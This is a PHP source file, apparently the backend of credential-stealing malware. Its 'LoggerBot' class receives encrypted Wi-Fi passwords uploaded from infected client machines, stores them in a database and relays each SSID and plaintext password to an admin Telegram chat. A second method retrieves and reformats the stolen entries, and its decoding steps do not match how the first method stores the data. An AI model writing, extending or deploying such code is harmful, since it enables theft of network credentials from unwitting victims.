<?php

class LoggerBot
{

    private function handleUploadWifiPasswords($data)
    {
        // Existing implementation (from previous context)
        try {
            $this->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));

            $clientId = $data['client_id'] ?? null;
            $wifiData = $data['wifi_data'] ?? null;

            if (!$clientId || !$wifiData) {
                $this->logError("Wi-Fi upload failed: Missing client_id or wifi_data");
                http_response_code(400);
                return ['error' => 'Missing client_id or wifi_data'];
            }

            $decryptedWifiData = $this->decrypt($wifiData);
            if ($decryptedWifiData === '') {
                $this->logError("Wi-Fi data decryption failed for client_id: $clientId");
                http_response_code(400);
                return ['error' => 'Decryption failed'];
            }

            $wifiJson = json_decode($decryptedWifiData, true);
            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid Wi-Fi data format for client_id: $clientId, decrypted: " . substr($decryptedWifiData, 0, 50));
                http_response_code(400);
                return ['error' => 'Invalid data format'];
            }

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
            VALUES (?, 'wifi', ?, NOW())"
            );
            $stmt->execute([$clientId, $decryptedWifiData]);

            $message = "📡 Wi-Fi Passwords Received:\n";
            $message .= "Client ID: $clientId\n";
            $message .= "Networks:\n";
            foreach ($wifiJson['wifi_profiles'] as $profile) {
                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
            }
            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);

            $this->logWebhook("Wi-Fi passwords processed for client_id: $clientId, profiles: " . count($wifiJson['wifi_profiles']));
            return ['status' => 'success'];
        } catch (Exception $e) {
            $this->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
            http_response_code(500);
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function getWifiPasswordsResult($clientId)
    {
        try {
            $stmt = $this->pdo->prepare(
                "SELECT message, created_at 
            FROM client_logs 
            WHERE client_id = ? AND log_type = 'wifi' 
            ORDER BY created_at DESC LIMIT 1"
            );
            $stmt->execute([$clientId]);
            $log = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$log) {
                return "No Wi-Fi data found for client $clientId";
            }

            // Decode Base64
            $decodedData = base64_decode($log['message']);
            if ($decodedData === false) {
                $this->logError("Base64 decode failed for client_id: $clientId");
                return "Error: Invalid Wi-Fi data format";
            }

            // Decompress gzip
            $decompressedData = @gzuncompress($decodedData);
            if ($decompressedData === false) {
                $this->logError("Gzip decompress failed for client_id: $clientId");
                return "Error: Failed to decompress Wi-Fi data";
            }

            // Decrypt data
            $decryptedData = $this->decrypt($decompressedData);
            if ($decryptedData === '') {
                $this->logError("Decryption failed for Wi-Fi data, client_id: $clientId");
                return "Error: Decryption failed";
            }

            // Parse JSON
            $wifiJson = json_decode($decryptedData, true);
            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
                $this->logError("Invalid JSON format for Wi-Fi data, client_id: $clientId");
                return "Error: Invalid data format";
            }

            // Format response
            $message = "📡 Wi-Fi Passwords for Client $clientId:\n";
            $message .= "Received at: " . $log['created_at'] . "\n";
            $message .= "Networks:\n";
            foreach ($wifiJson['wifi_profiles'] as $profile) {
                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
            }

            return $message;
        } catch (Exception $e) {
            $this->logError("Failed to retrieve Wi-Fi data for client_id: $clientId, error: " . $e->getMessage());
            return "Error retrieving Wi-Fi data: " . $e->getMessage();
        }
    }
}
